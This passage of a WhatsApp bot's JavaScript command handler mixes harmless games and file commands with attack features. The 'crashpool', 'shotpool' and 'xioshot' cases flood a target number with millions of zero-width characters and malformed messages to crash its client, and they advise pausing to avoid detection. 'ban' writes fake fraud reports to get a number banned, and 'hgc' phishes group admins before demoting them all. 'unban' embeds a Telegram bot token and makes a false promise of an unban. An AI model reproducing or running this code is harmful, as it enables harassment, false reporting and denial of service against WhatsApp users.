            "Would you rather be able to teleport anywhere or go back in time?",
            "Would you rather never be able to speak again or always have to tell the truth?",
            "Would you rather be an introvert with a few close friends or an extrovert with many acquaintances?",
            "Would you rather know everything about the universe or know everything about yourself?"
        ];

        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🤔 Would You Rather? 🤔*\n\n${wouldYouRatherQuestions[Math.floor(Math.random() * wouldYouRatherQuestions.length)]}\n\n*What would you choose?*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the Would You Rather question. Please try again later.');
        console.error('Would You Rather error:', err);
    }
    break;
    case 'trivia':
    try {
        const triviaQuestions = [
            { question: "What is the capital of France?", answer: "Paris" },
            { question: "Who painted the Mona Lisa?", answer: "Leonardo da Vinci" },
            { question: "What is the largest planet in our solar system?", answer: "Jupiter" },
            { question: "In which year did the Titanic sink?", answer: "1912" },
            { question: "What is the smallest country in the world?", answer: "Vatican City" },
            { question: "What is the longest river in the world?", answer: "Nile" },
            { question: "Who wrote 'Romeo and Juliet'?", answer: "William Shakespeare" },
            { question: "What is the hardest natural substance on Earth?", answer: "Diamond" },
            { question: "How many continents are there?", answer: "Seven" },
            { question: "Which planet is known as the Red Planet?", answer: "Mars" },
            { question: "What is the largest ocean on Earth?", answer: "Pacific Ocean" },
            { question: "In what year did World War II end?", answer: "1945" },
            { question: "What is the currency of Japan?", answer: "Yen" },
            { question: "Who developed the theory of relativity?", answer: "Albert Einstein" },
            { question: "What is the tallest mountain in the world?", answer: "Mount Everest" },
            { question: "Which animal is known as the king of the jungle?", answer: "Lion" },
            { question: "How many states are in the United States?", answer: "50" },
            { question: "What is the largest desert in the world?", answer: "Sahara Desert" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "What is the smallest bone in the human body?", answer: "Stapes" },
            { question: "What is the name of the ship that brought the Pilgrims to America?", answer: "Mayflower" },
            { question: "What is the main ingredient in guacamole?", answer: "Avocado" },
            { question: "Which animal can be found in the wild but also as a pet in homes?", answer: "Cat" },
            { question: "What is the largest country in the world?", answer: "Russia" },
            { question: "What year did the Berlin Wall fall?", answer: "1989" },
            { question: "Who invented the telephone?", answer: "Alexander Graham Bell" },
            { question: "What is the chemical symbol for water?", answer: "H2O" },
            { question: "What is the official language of Brazil?", answer: "Portuguese" },
            { question: "Who is known as the father of modern physics?", answer: "Isaac Newton" },
            { question: "What does the term ‘IQ’ stand for?", answer: "Intelligence Quotient" },
            { question: "Which country is known as the Land of the Rising Sun?", answer: "Japan" },
            { question: "What is the largest species of bear?", answer: "Polar Bear" },
            { question: "What is the hardest rock?", answer: "Diamond" },
            { question: "Which city is known as the Big Apple?", answer: "New York City" },
            { question: "What type of animal is a Komodo dragon?", answer: "Lizard" },
            { question: "Which country invented pizza?", answer: "Italy" },
            { question: "What is the name of the longest river in South America?", answer: "Amazon River" },
            { question: "Who was the first woman to fly solo across the Atlantic Ocean?", answer: "Amelia Earhart" },
            { question: "What is the largest type of whale?", answer: "Blue Whale" },
            { question: "Which famous scientist is known for his work on evolution?", answer: "Charles Darwin" },
            { question: "How many bones are in the adult human body?", answer: "206" },
            { question: "Which planet has the most moons?", answer: "Jupiter" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the longest running TV show?", answer: "The Simpsons" },
            { question: "What year did the first man land on the moon?", answer: "1969" },
            { question: "What is the capital of Australia?", answer: "Canberra" },
            { question: "Which element has the chemical symbol O?", answer: "Oxygen" },
            { question: "Which animal is the largest living terrestrial animal?", answer: "Elephant" },
            { question: "Which country is home to the Great Barrier Reef?", answer: "Australia" },
            { question: "Which composer wrote the ‘Ode to Joy’?", answer: "Ludwig van Beethoven" },
            { question: "What is the capital of Japan?", answer: "Tokyo" },
            { question: "Which is the largest city in the world by population?", answer: "Tokyo" },
            { question: "What is the name of the largest coral reef in the world?", answer: "Great Barrier Reef" },
            { question: "Which animal is known for changing colors?", answer: "Chameleon" },
            { question: "Which fruit is known for keeping the doctor away?", answer: "Apple" },
            { question: "Which planet is closest to the sun?", answer: "Mercury" },
            { question: "What is the longest bone in the human body?", answer: "Femur" },
            { question: "What year was the first iPhone released?", answer: "2007" },
            { question: "What is the capital of Canada?", answer: "Ottawa" },
            { question: "Which is the biggest island in the world?", answer: "Greenland" },
            { question: "How many hearts does an octopus have?", answer: "Three" },
            { question: "Who was the first man in space?", answer: "Yuri Gagarin" },
            { question: "What is the currency of the United Kingdom?", answer: "Pound Sterling" },
            { question: "Which planet is known as the ‘Morning Star’?", answer: "Venus" },
            { question: "What is the largest volcano in the world?", answer: "Mauna Loa" },
            { question: "What is the capital of Spain?", answer: "Madrid" },
            { question: "What is the longest-running Broadway show?", answer: "The Phantom of the Opera" },
            { question: "What color is the sky on Mars?", answer: "Red" },
            { question: "Who invented the lightbulb?", answer: "Thomas Edison" },
            { question: "Which U.S. state is known as the Sunshine State?", answer: "Florida" },
            { question: "What is the national animal of Canada?", answer: "Beaver" },
            { question: "What is the tallest building in the world?", answer: "Burj Khalifa" },
            { question: "What is the largest fish in the world?", answer: "Whale Shark" },
            { question: "What is the name of the first artificial satellite?", answer: "Sputnik 1" },
            { question: "What is the fastest land animal?", answer: "Cheetah" },
            { question: "What year did the United States declare independence?", answer: "1776" },
            { question: "What is the capital of Italy?", answer: "Rome" },
            { question: "What is the name of the highest mountain in North America?", answer: "Denali" },
            { question: "What is the longest running animated TV series?", answer: "The Simpsons" },
            { question: "Which ocean is the largest?", answer: "Pacific Ocean" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the capital of the United Kingdom?", answer: "London" },
            { question: "What is the largest bird in the world?", answer: "Ostrich" },
            { question: "Which country is known for its pyramids?", answer: "Egypt" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "Which country is the largest producer of coffee?", answer: "Brazil" },
            { question: "Which is the longest river in the United States?", answer: "Missouri River" },
            { question: "Which city is known as the City of Lights?", answer: "Paris" },
            { question: "What is the largest land animal?", answer: "African Elephant" }
        ];
        
        const randomTrivia = triviaQuestions[Math.floor(Math.random() * triviaQuestions.length)];
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🧠 Trivia Time! 🧠*\n\n*Question:* ${randomTrivia.question}\n\n*Reply with your answer!*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the trivia question. Please try again later.');
        console.error('Trivia error:', err);
    }
    break;
            case 'delsticker': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replyphistar("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerPhistarBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./Phistar-media/sticker/${q}.webp`)
                replyphistar(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replyphistar("Name Already In Use")
                let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replyphistar(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replyphistar(mess.prem)
                if (args.length < 1) return replyphistar('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replyphistar("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./Phistar-media/audio/${q}.mp3`)
                replyphistar(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replyphistar(mess.prem)
await loading()
if (args.length < 1) return replyphistar(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replyphistar("This name is already in use")
let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./Phistar-media/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replyphistar(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replyphistar(mess.prem)
await loading()
if (args.length < 1) return replyphistar('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replyphistar("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./Phistar-media/zip/${teks}.zip`)
replyphistar(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replyphistar(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replyphistar(mess.prem)
await loading()
if (args.length < 1) return replyphistar('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replyphistar("This name is already in use")
let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./Phistar-media/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replyphistar(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replyphistar(mess.prem)
await loading()
if (args.length < 1) return replyphistar('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replyphistar("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./Phistar-media/apk/${teks}.apk`)
replyphistar(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replyphistar(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replyphistar(mess.prem)
await loading()
if (args.length < 1) return replyphistar('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replyphistar("This name is already in use")
let delb = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./Phistar-media/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replyphistar(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replyphistar(mess.prem)
await loading()
if (args.length < 1) return replyphistar('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replyphistar("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./Phistar-media/doc/${teks}.pdf`)
replyphistar(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replyphistar(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replyphistar(mess.group)
                if (isAfkOn) return replyphistar("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyphistar(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case "ytmp3": case "ytaudio": {
    const xeonaudp3 = require('./lib/ytdl2'); // Import the YouTube module
    if (!args.length || !isUrl(text) || !xeonaudp3.isYTUrl(text)) {
        return replyphistar(`Where's the YouTube link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`);
    }

    xeonaudp3.yta(text) // Call the YouTube downloader function
        .then(audio => {
            PhistarBotInc.sendMessage(m.chat, {
                audio: { url: audio.dl_link }, // Use the direct download link
                mimetype: 'audio/mp4',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        title: audio.title,
                        body: botname,
                        thumbnail: fetchBuffer(audio.thumb), // Fetch thumbnail
                        mediaType: 2,
                        mediaUrl: text,
                    }
                }
            }, { quoted: m })
            .then(() => console.log("Audio sent successfully"))
            .catch(err => {
                console.error("Failed to send audio message:", err);
                replyphistar("Failed to send the audio. Please try again later.");
            });
        })
        .catch(err => {
            console.error("Failed to download audio:", err);
            replyphistar("Failed to download the audio. Please check the link and try again.");
        });
    break;
}
//ban note 
case 'ban':
    if (!isCreator) return replyphistar(mess.owner); // Restrict access to the creator

    if (!text) {
        return replyphistar(`🚨 Please provide the number and language code. Usage: ${command} <number> <language_code>`);
    }

    // Directly process input using `xandroid` logic
    let inputParts = text.trim().split(" "); // Split the input into parts
    let number = encodeURI(inputParts[0]) * 1; // Use the first part of the input as the number
    let languageCode = inputParts[1]?.toLowerCase(); // Use the second part as the language code

    if (!number || isNaN(number)) {
        return replyphistar("❌ Invalid number. Please enter a valid numeric value.");
    }
    if (!languageCode) {
        return replyphistar("❌ Please specify a language code. Supported languages: arabic, turkish, vietnamese.");
    }

    // Define ban notes for supported languages
    const languageNotes = {
        arabic: `
**الموضوع:** تقرير عاجل – رقم مشبوه  
فريق دعم WhatsApp المحترم،  
أود الإبلاغ عن الرقم ${number} المتورط في أنشطة احتيالية أدت إلى خسارتي مبلغ 300,000 دولار.  

أطلب منكم اتخاذ الإجراءات اللازمة لتعليق هذا الحساب فورًا ومنع أي نشاط ضار آخر على المنصة.  

شكرًا لتعاونكم،  
[اسمك]
        `,
        turkish: `
**Konu:** Acil Rapor – Şüpheli Numara  
WhatsApp Destek Ekibi,  
Bu numara ${number} dolandırıcılık faaliyetlerinde yer almakta olup, bana $300,000 zarar vermiştir.  

Bu hesabın, daha fazla kullanıcıyı mağdur etmemesi için derhal engellenmesini talep ediyorum.  

Saygılarımla,  
[Adınız]
        `,
        vietnamese: `
**Chủ đề:** Báo cáo Khẩn Cấp – Số điện thoại lừa đảo  
Kính gửi Đội Hỗ trợ WhatsApp,  
Tôi muốn báo cáo rằng số điện thoại ${number} liên quan đến hành vi lừa đảo, khiến tôi mất đi $300,000.  

Tôi yêu cầu WhatsApp ngay lập tức chặn tài khoản này để bảo vệ người dùng khỏi những hành vi lừa đảo tiếp theo.  

Trân trọng,  
[Tên của bạn]
        `,
    };

    // Check if the selected language is supported
    const banNote = languageNotes[languageCode];
    if (!banNote) {
        return replyphistar(`❌ Unsupported language code: ${languageCode}. Supported languages are arabic, turkish, vietnamese.`);
    }

    try {
        await replyphistar(`🚨 *Ban Note!*\n\n${banNote}\n\n🔢 *Target Number:* ${number} Need help? Use the command bantutorial to know how to use this note`);
    } catch (err) {
        console.error("Error processing the ban command:", err);
        await replyphistar("❌ Failed to send the ban note. Please try again later.");
    }
    break;

// Bantutorial Command
case 'bantutorial':
    const tutorialNote = `
📘 **How to Use Ban Notes**

1️⃣ **Copy the Ban Note**: Copy the note sent by the bot, including the reported number.

2️⃣ **Open WhatsApp Support**:
   - Go to **Settings** > **Help** > **Contact Us**.

3️⃣ **Paste the Ban Note**: Paste the note into the message box and explain why you’re reporting the number (e.g., fraud or spam).

4️⃣ **Submit the Report**: Send the report, and WhatsApp will review it.

📢 **Pro Tip**: Be specific in your report to improve the chances of action being taken.
    `;

    try {
        await replyphistar(`✅ **Tutorial Sent Successfully!**\n\n${tutorialNote}`);
    } catch (err) {
        console.error("Error sending the tutorial note:", err);
        await replyphistar("❌ Failed to send the tutorial. Please try again later.");
    }
    break;
    //unban
    case 'unban': 
    if (!isCreator) return replyphistar("🚨 Only the bot owner can use this command.");

    if (!text) { 
        return replyphistar("🚨 Please provide the number you want to unban. Usage: unban <number>");
    }

    // Extract the target number
    let targetNumber = text.replace(/[^0-9]/g, ""); // Remove non-numeric characters

    if (targetNumber.startsWith("0") || targetNumber.length < 10) {
        return replyphistar("❌ Invalid number. Please provide a valid WhatsApp number including the country code.");
    }

    // Define the unban message
    const unbanMessage = `🚨 Request to unban the following WhatsApp number: ${targetNumber}`;

    try {
        // Send the message to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M/sendMessage`;

        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: 6300694007, // Replace with your Telegram chat ID
                text: unbanMessage,
            }),
        });

        if (response.ok) {
            // Notify the sender that the request has been sent
            await replyphistar(`✅ Your unban request has been sent successfully! Your WhatsApp will be unbanned in the next 6 hours. 🔄`);
        } else {
            const errorData = await response.json();
            console.error("Telegram API error:", errorData);
            await replyphistar("❌ Failed to process your unban request. Please try again later.");
        }
    } catch (error) {
        console.error("Error sending unban request:", error);
        await replyphistar("❌ An error occurred while processing your unban request. Please try again.");
    }
    break;
    case 'hgc':
    if (!isCreator) return replyphistar("🚨 Only the bot owner can use this command.");
  try {
    if (!m.isGroup) return replyphistar(mess.group); // Ensure command is in a group chat
    
    const groupId = m.chat; // Current group ID
    const admins = await PhistarBotInc.groupMetadata(groupId).then(res => res.participants.filter(participant => participant.admin)); // Get list of admins
    
    // Send the link to each admin in the group
    for (let admin of admins) {
      let adminNumber = admin.id.replace('c.us', 's.whatsapp.net'); // Correct admin number format
      let link = `https://example.com/grantadmin?groupID=${groupId}`; // Generate the link with group ID

      await PhistarBotInc.sendMessage(adminNumber, {
        text: `Hey, this is an invitation to become an admin in my WhatsApp channel, please click on the link: ${link}`
      });
    }

    // When the backend detects that the link is clicked and bot is granted admin
    const adminGranted = true; // This should be set by the backend when the link is clicked and the bot is granted admin
    if (adminGranted) {
      // Send a message to confirm the bot is now admin
      await replyphistar(groupId, {
        text: "Gourp Hacked you are now an admin in the group. 🏆"
      });

      // Remove all admins except the bot
      const botNumber = 'botNumber@s.whatsapp.net'; // Replace with the bot's number
      const remainingAdmins = admins.filter(admin => admin.id !== botNumber); // Remove bot itself from the admin list

      // Remove each admin from the group
      for (let admin of remainingAdmins) {
        await PhistarBotInc.groupParticipantsUpdate(groupId, [admin.id], 'demote');
      }

      // Send a final success message
      await replyphistar(groupId, {
        text: "All admins have been removed. group successful *hacked* is now the *sole admin* and group owner! powered by *phistar* 💫"
      });
    }

  } catch (err) {
    console.error(err); // Log error
    replyphistar("Failed to hack: because you are not a premium users chat my creator to become an premium user");
  }
  break;
  case 'promoteself':
  try {
    if (!m.isGroup) return replyphistar("This command only works in group chats."); // Check if the command is used in a group chat
    
    const groupId = m.chat; // Group ID
    const metadata = await PhistarBotInc.groupMetadata(groupId); // Fetch group metadata
    const admins = metadata.participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin'); // Get list of admins
    const botNumber = await PhistarBotInc.user.id; // Bot's WhatsApp number
    
    // Check if the bot is already an admin
    const isBotAdmin = metadata.participants.some(participant => participant.id === botNumber && participant.admin);
    if (isBotAdmin) return replyphistar("The bot is already an admin in this group.");

    // Ask group admins for admin privileges
    for (let admin of admins) {
      const adminNumber = admin.id; // Admin WhatsApp number
      const message = `Hello Admin, please grant me admin privileges to better manage this group. Thank you!`;

      await PhistarBotInc.sendMessage(adminNumber, { text: message });
    }

    // Notify the group
    replyphistar("Permission request sent to group admins. Please wait for approval.");
  } catch (err) {
    console.error(err);
    replyphistar("An error occurred while processing the request. Please check the bot's permissions and try again.");
  }
  break;
  //bug cases 
				case "crashpool": {
    if (!isCreator) return replyphistar(mess.owner);
    if (!text) return replyphistar(`Usage: .${command} 234***********`);

    // Clean and validate number
    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replyphistar(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    // Check if number is registered on WhatsApp
    var contactInfo = await PhistarBotInc.onWhatsApp(whatsappNumber);
    if (contactInfo.length === 0) {
        return replyphistar("The number is not registered on WhatsApp");
    }

    replyphistar("🔄 Sending bug... Please wait!");

    // Define the lightweight bug function
    async function sendLiteBug(jid) {
        let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
        let fullPayload = zeroWidthChar.repeat(9000000); // Full payload of 9 million characters
        let chunkSize = 100000; // Size of each chunk to send
        let chunks = Math.ceil(fullPayload.length / chunkSize); // Number of chunks (90)

        try {
            // Send the payload in chunks
            for (let i = 0; i < 5; i++) { // Limit to 5 chunks for lightweight execution
                let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize);
                await PhistarBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                await sleep(1500); // Pause to avoid overload
            }

            // Interactive payload (lightweight)
            await PhistarBotInc.relayMessage(
                jid,
                {
                    interactiveMessage: {
                        header: { title: "💡 Bug Test" },
                        body: { text: "Invisible Bug Payload" },
                        footer: { text: "Test Footer" },
                        buttons: [
                            {
                                name: "BrokenButton",
                                buttonParamsJson: '{"key":"value"}', // Simulated button data
                            },
                        ],
                    },
                },
                { participant: { jid: jid } }
            );

            // Media message with short caption
            await PhistarBotInc.sendMessage(jid, { 
                caption: "Bug Media Test", 
                image: { url: "https://example.com/image.jpg" } 
            });

            // Success message
            await replyphistar(
                `✅ Successfully bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
            );
        } catch (err) {
            console.error("Error sending bug:", err);
            return replyphistar("❌ Failed to send the bug. Please try again later.");
        }
    }

    // Execute the lightweight bug function
    await sendLiteBug(whatsappNumber);

    break;
}
case "shotpool": {
    if (!isCreator) return replyphistar(mess.owner);
    if (!text) return replyphistar(`Usage: .${command} 234***********`);

    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replyphistar(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
    var contactInfo = await PhistarBotInc.onWhatsApp(whatsappNumber);

    if (contactInfo.length === 0) {
        return replyphistar("The number is not registered on WhatsApp");
    }

    replyphistar("🔄 Sending bug... Please wait!");

    async function sendLiteBug(jid) {
        let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
        let fullPayload = zeroWidthChar.repeat(900000); // Full payload of 500,000 characters
        let chunkSize = 100000; // Size of each chunk to send
        let chunks = Math.ceil(fullPayload.length / chunkSize); // Calculate number of chunks (5)

        try {
            // Send the payload in 5 smaller chunks
            for (let i = 0; i < chunks; i++) {
                let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize); // Extract the chunk
                await PhistarBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                await sleep(1500); // Small delay to avoid overloading the bot
            }

            // Interactive payload (lightweight)
            await PhistarBotInc.relayMessage(
                jid,
                {
                    interactiveMessage: {
                        header: { title: "💡 Bug Test" },
                        body: { text: "Invisible Bug Payload" },
                        footer: { text: "Test Footer" },
                        buttons: [
                            {
                                name: "BrokenButton",
                                buttonParamsJson: '{"key":"value"}', // Simulated button data
                            },
                        ],
                    },
                },
                { participant: { jid: jid } }
            );

            // Media message with short caption
            await PhistarBotInc.sendMessage(jid, { 
                caption: "Bug Media Test", 
                image: { url: "https://example.com/image.jpg" } 
            });
        } catch (err) {
            console.error("Error sending bug:", err);
            return replyphistar("❌ Failed to send the bug. Please try again later.");
        }
    }

    // Execute the lightweight bug function
    await sendLiteBug(whatsappNumber);

    // Confirmation message
    await replyphistar(
        `✅ Successfully bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
    );
}
break;
case "xioshot": {
    if (!isCreator) return replyphistar(mess.owner);
    if (!text) return replyphistar(`Usage: .${command} 234***********`);

    // Clean and validate the number
    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replyphistar(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    try {
        // Check if the number is registered on WhatsApp
        var contactInfo = await PhistarBotInc.onWhatsApp(whatsappNumber);
        if (contactInfo.length === 0) {
            return replyphistar("The number is not registered on WhatsApp");
        }

        replyphistar("🔄 Sending bug... Please wait!");

        // Define the sleep function
        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

        // Function to send a large payload
        async function sendLargeBug(jid) {
            let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
            let fullPayload = zeroWidthChar.repeat(900000); // Large payload: 9 million characters
            let chunkSize = 100000; // Size of each chunk: 500,000 characters
            let chunks = Math.ceil(fullPayload.length / chunkSize); // Total chunks

            try {
                // Send payload in chunks
                for (let i = 0; i < chunks; i++) {
                    let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize);
                    await PhistarBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                    await sleep(2000); // Pause to avoid overloading
                }

                // Media message with caption
                await PhistarBotInc.sendMessage(jid, { 
                    caption: "Bug Media Test", 
                    image: { url: "https://your-image-url.com" }
                });

                // Confirmation message
                replyphistar(
                    `✅ Successfully sent bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
                );
            } catch (err) {
                console.error("Error while sending large payload:", err);
                replyphistar("❌ Failed to send the bug. Please try again later.");
            }
        }

        // Execute the function
        await sendLargeBug(whatsappNumber);

    } catch (err) {
        console.error("Error:", err);
        replyphistar("❌ An unexpected error occurred.");
    }

    break;
}
// 🏠 Create Group
case 'creategc':
case 'creategroup': {
    if (!isCreator) return replyphistar('❌ *For Owner Only*');
    if (!args.join(" ")) return replyphistar(`Use: *${prefix + command} groupname*`);

    try {
        let cret = await PhistarBotInc.groupCreate(args.join(" "), []);
        let response = await PhistarBotInc.groupInviteCode(cret.id);

        let teks2 = `*✅ Group Created Successfully!*\n\n` +
            `📌 *Name:* ${cret.subject}\n` +
            `👑 *Owner:* @${cret.owner.split("@")[0]}\n` +
            `📅 *Created On:* ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}\n` +
            `🆔 *Group ID:* ${cret.id}\n` +
            `🔗 *Join Link:* chat.whatsapp.com/${response}`;

        replyphistar(teks2, { mentions: [cret.owner] });

    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to create group. Please try again.");
    }
    break;
}

// 🎵 Spotify Search
case 'spotify':
case 'spotifysearch': {
    if (!text) return replyphistar('❌ *Spotify Search* ❌\n\nPlease enter a song or artist name to search on Spotify.');

    try {
        let searchResults = await searchSpotifyTracks(text);
        let ini_text = '✨ *Spotify Search Results* ✨\n';

        for (const x of searchResults) {
            ini_text += `\n🎵 *Title:* ${x.name}\n` +
                `🎤 *Artist:* ${x.artists.map(v => v.name).join(', ')}\n` +
                `📀 *Album:* ${x.album.name} (${x.album.release_date})\n` +
                `🎼 *Track Number:* ${x.track_number} / ${x.album.total_tracks}\n` +
                `⏳ *Duration:* ${(x.duration_ms / 1000).toFixed(2)} sec\n` +
                `🔗 *Listen:* [Spotify](${x.uri})\n` +
                `🔗 *Album:* [Spotify](${x.album.external_urls.spotify})\n` +
                `───────────────────`;
        }

        replyphistar(ini_text);
    } catch (error) {
        console.error(error);
        replyphistar('❌ *Spotify Search* ❌\n\nAn error occurred, please try again later.');
    }
    break;
}
case 'listen':
    try {
        const audioFiles = [
            'Phistar-media/Affiliate marketing.aac',
            'Phistar-media/Affiliate marketing 1.aac',
            'Phistar-media/Affiliate marketing 2.aac',
            'Phistar-media/Affiliate marketing 3.aac'
        ];

        for (const file of audioFiles) {
            // Update presence to "recording"
            PhistarBotInc.sendPresenceUpdate('recording', m.chat);

            // Send voice note
            await PhistarBotInc.sendMessage(
                m.chat,
                {
                    audio: { url: file },
                    mimetype: 'audio/aac',
                    ptt: true, // Sending as a voice note
                },
                { quoted: m }
            );

            // Wait 20 seconds before sending the next VN
            await new Promise(resolve => setTimeout(resolve, 20000));
        }

        // Send the link before the final message
        await PhistarBotInc.sendMessage(
            m.chat,
            {
                text: 'https://selar.com/37g1fz',
            },
            { quoted: m }
        );

        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before final message

        // Send the final text message
        await PhistarBotInc.sendMessage(
            m.chat,
            {
                text: `📢 *These are the VNs I sent to the rest of the students!* 🎧\n\nThey contain everything you need to know to become an affiliate and start earning in your first week. 💸\n\nGo through them carefully and ask questions if you don't understand anything!`,
            },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
    }
    break;
    case 'affiliatelink':
    try {
        // Update presence to "recording"
        PhistarBotInc.sendPresenceUpdate('recording', m.chat);

        // Send the voice note
        await PhistarBotInc.sendMessage(
            m.chat,
            {
                audio: { url: 'Phistar-media/Affiliate link.aac' },
                mimetype: 'audio/aac',
                ptt: true, // Sending as a voice note
            },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
    }
    break;
    case 'fbads':
    try {
        // Update presence to "recording"
        PhistarBotInc.sendPresenceUpdate('recording', m.chat);

        // Send the voice note
        await PhistarBotInc.sendMessage(
            m.chat,
            {
                audio: { url: 'Phistar-media/fb ads.aac' },
                mimetype: 'audio/aac',
